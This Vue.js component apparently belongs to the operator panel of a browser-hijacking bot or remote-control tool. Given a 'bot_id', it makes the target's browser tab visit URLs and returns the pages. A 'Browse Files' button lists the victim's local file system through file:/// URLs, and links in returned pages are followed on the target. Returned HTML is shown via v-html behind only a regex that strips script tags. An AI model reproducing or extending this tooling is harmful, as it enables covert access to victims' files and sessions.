<template>
  <div class="mt-3">
    <b-input-group>
      <b-input-group-prepend>
        <b-button variant="outline-secondary" @click="browseFiles" title="Browse File System">
          <i class="fa fa-folder-open"></i> Browse Files
        </b-button>
      </b-input-group-prepend>
      <b-form-input
        v-model="targetUrl"
        placeholder="Enter URL to visit via target tab (e.g., file:///C:/ or https://google.com)"
        @keyup.enter="visitUrl"
      ></b-form-input>
      <b-input-group-append>
        <b-button variant="danger" @click="stopVisit" :disabled="!loading">
          Stop
        </b-button>
        <b-button variant="primary" @click="visitUrl" :disabled="loading">
          <b-spinner small v-if="loading"></b-spinner>
          Visit
        </b-button>
      </b-input-group-append>
    </b-input-group>

    <div v-if="error" class="alert alert-danger mt-2">
      {{ error }}
    </div>

    <div class="mt-3 remote-content-wrapper" ref="contentArea" @click="handleContentClick">
      <div v-if="content" v-html="sanitizedContent" class="remote-content-display"></div>
      <div v-else-if="!loading" class="text-muted text-center p-5 border rounded">
        Enter a URL and click "Visit" to see the content here.
      </div>
    </div>
  </div>
</template>

<script>
import { api_request } from "./utils.js";

export default {
  name: "DataRemote",
  props: {
    id: {
      type: String,
      required: true,
    },
    userAgent: {
      type: String,
      default: "",
    },
  },
  data() {
    return {
      targetUrl: "",
      content: "",
      error: null,
      loading: false,
      currentBaseUrl: ""
    };
  },
  computed: {
    sanitizedContent() {
      if (!this.content) return "";
      // Basic sanitization: remove scripts to avoid local execution issues
      return this.content.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "");
    }
  },
  methods: {
    async visitUrl() {
      if (!this.targetUrl) return;
      
      this.loading = true;
      this.error = null;
      
      try {
        const result = await api_request("POST", "/remote-control", {}, {
          bot_id: this.id,
          url: this.targetUrl
        });
        
        if (result.error) {
          this.error = result.error;
          this.content = "";
        } else {
          this.content = result.html;
          this.currentBaseUrl = result.url;
        }
      } catch (e) {
        this.error = e.error || e.message || "An error occurred";
        this.content = "";
      } finally {
        this.loading = false;
      }
    },
    async stopVisit() {
      if (!this.loading) return;
      try {
        await api_request("POST", "/stop-remote-control", {}, {
          bot_id: this.id
        });
        this.loading = false;
        this.error = "Stopped by user";
      } catch (e) {
        console.error("Error stopping visit:", e);
      }
    },
    browseFiles() {
      const ua = this.userAgent.toLowerCase();
      if (ua.includes("windows")) {
        this.targetUrl = "file:///C:/";
      } else {
        this.targetUrl = "file:///";
      }
      this.visitUrl();
    },
    handleContentClick(event) {
      const link = event.target.closest("a");
      if (link) {
        event.preventDefault();
        let href = link.getAttribute("href");
        if (href) {
          // Resolve relative URL
          try {
            const absoluteUrl = new URL(href, this.currentBaseUrl).href;
            this.targetUrl = absoluteUrl;
            this.visitUrl();
          } catch (e) {
            console.error("Invalid URL:", href);
            // Fallback for file paths or weird URLs
            if (this.currentBaseUrl.startsWith("file://")) {
               // Handle common file link formats
               if (href.startsWith("/")) {
                 // Absolute path on same drive?
                 // This is tricky correctly. Let's try joining.
                 this.targetUrl = new URL(href, this.currentBaseUrl).href;
               } else {
                 this.targetUrl = new URL(href, this.currentBaseUrl).href;
               }
            } else {
              this.targetUrl = href;
            }
            this.visitUrl();
          }
        }
      }
    }
  }
};
</script>

<style scoped>
.remote-content-wrapper {
  max-height: 600px;
  overflow: auto;
  border: 1px solid #dee2e6;
  border-radius: 4px;
  background: #f8f9fa;
}
.remote-content-display {
  padding: 15px;
  background: white;
  min-height: 200px;
}
/* Style the content to look more like a browser view */
.remote-content-display >>> a {
  color: #007bff;
  text-decoration: underline;
  cursor: pointer;
}
.remote-content-display >>> img {
  max-width: 100%;
}
</style>
